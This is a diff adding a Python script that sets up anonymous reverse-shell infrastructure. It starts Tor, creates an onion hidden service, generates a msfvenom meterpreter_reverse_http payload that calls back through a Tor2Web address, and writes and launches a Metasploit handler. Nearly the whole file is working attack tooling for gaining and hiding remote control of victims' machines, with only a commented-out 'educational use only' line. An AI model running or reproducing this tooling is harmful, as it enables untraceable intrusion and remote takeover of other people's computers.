@@ -1,0 +1,147 @@
+# coding=utf-8
+import os
+import shutil
+import subprocess
+import time
+
+from stem.control import Controller
+from pyfiglet import Figlet
+from termcolor import colored
+
+
+def generatebatch():
+    """Generate metasploit batch .rc file"""
+
+    with open('msfconsole.rc', 'w') as f:
+        f.write("use exploit/multi/handler\n")
+        f.write("set PAYLOAD python/meterpreter_reverse_http\n")
+        f.write("set LHOST 127.0.0.1\n")
+        f.write("set LPORT 5000\n")
+        f.write("exploit -jz\n")
+
+    print("[+] msfconsole.rc batch file generated in current directory")
+
+    # Asking for valid response
+    while True:
+        response = raw_input("[!] Start msfconsole now? [yes/no] ")
+        if not response.isalpha():
+            continue
+        if response == 'yes' or response == 'no':
+            break
+
+    if response == 'yes':
+        subprocess.Popen(['xterm', '-e', 'msfconsole -q -r msfconsole.rc'])
+
+
+def generatepayload(hostname):
+    """Generating msfvenom python nostage payload"""
+
+    # Check if msfvenom is installed
+    rc = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
+    if rc:
+        print('[!] Unable to find msfvenom! Exiting..')
+        exit(0)
+    print(" * Generating msfvenom python/meterpreter_reverse_http payload..")
+    # Append .ws Tor2Web extension
+    lhost = hostname + ".ws"
+    # Generate payload
+    payload = "msfvenom -p python/meterpreter_reverse_http LHOST=" + lhost + " LPORT=80 > payload.py"
+    subprocess.call(payload, stdout=subprocess.PIPE, shell=True)
+    print("[+] payload.py generated in current directory")
+
+
+def stem():
+    """Start hidden service"""
+
+    # Check if tor is installed
+    rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
+    if rc:
+        print('[!] Unable to find tor! Exiting..')
+        exit(0)
+    else:
+        # Start tor
+        print(' * Starting tor network..')
+        os.system("tor --quiet &")
+
+    # Give some time to start tor circuit..
+    time.sleep(5)
+
+    with Controller.from_port() as controller:
+        controller.authenticate()
+        # Create a directory for hidden service
+        hidden_service_dir = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service_data')
+
+        # Create a hidden service where visitors of port 80 get redirected to local
+        # port 5000
+        try:
+            print(" * Creating hidden service in %s" % hidden_service_dir)
+            result = controller.create_hidden_service(hidden_service_dir, 80, target_port=5000)
+        except:
+            print("[!] Unable to connect ! Is tor running? Exiting..")
+            exit(0)
+
+        # The hostname is only available when we can read the hidden service
+        # directory. This requires us to be running with the same user as tor process.
+        if result.hostname:
+            print(" * Service is available at %s redirecting to local port 5000" % result.hostname)
+            # Generate payload
+            generatepayload(result.hostname)
+            # Generate metasploit batch file
+            generatebatch()
+        else:
+            print(
+                "* Unable to determine our service's hostname, probably due to being unable to read the hidden "
+                "service directory. Exiting..")
+            exit(0)
+
+        try:
+            raw_input(" * RUNNING - hit enter, or ^C to quit")
+        finally:
+            # Shut down the hidden service and clean it off disk. Note that you *don't*
+            # want to delete the hidden service directory if you'd like to have this
+            # same *.onion address in the future.
+            print(" * Shutting down hidden service and clean it off disk")
+            controller.remove_hidden_service(hidden_service_dir)
+            shutil.rmtree(hidden_service_dir)
+
+
+def main():
+    """Main function of tool"""
+
+    print("""
+                        ░░░░░░░░░░                    
+                      ░░░░░░░░                        
+                    ░░░░░░░░░░                       
+                  ░░░░░░░░░░░░░░                 
+                ░░░░░░░░░░░░░░░░░░                      
+              ░░░░░░░░░░░░░░░░░░░░░░           
+▒▒          ░░░░░░██░░░░██░░░░░░░░░░░░                  
+▒▒          ░░░░██▓▓░░░░▓▓██░░░░░░░░░░░░       
+▒▒        ░░░░██▓▓░░░░░░░░▓▓██░░░░░░░░░░              
+▒▒        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░              
+  ▒▒      ░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░              
+    ▒▒    ░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░              
+      ▒▒▒▒░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░▒▒▒▒▒▒        
+            ░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░        ▒▒      
+                ▒▒▒▒▒▒▒▒▒▒░░░░░░                ▒▒    
+                      ░░░░░░░░                    ▒▒  
+        ▒▒▒▒▒▒▒▒▒▒              ▒▒                  ▒▒
+      ▒▒                          ▒▒                ▒▒
+    ▒▒                              ▒▒              ▒▒
+  ▒▒                                  ▒▒              
+  ▒▒                                    ▒▒            
+  ▒▒                                      ▒▒          
+  ▒▒                                        ▒▒        
+                                              ▒▒      
+    """)
+
+    #print(colored("calfcrusher@inventati.org | For educational use only", 'green'))
+    #print('\n')
+    time.sleep(5)
+    stem()
+
+
+if __name__ == "__main__":
+    os.system('clear')
+    main()
+    print("Bye!")
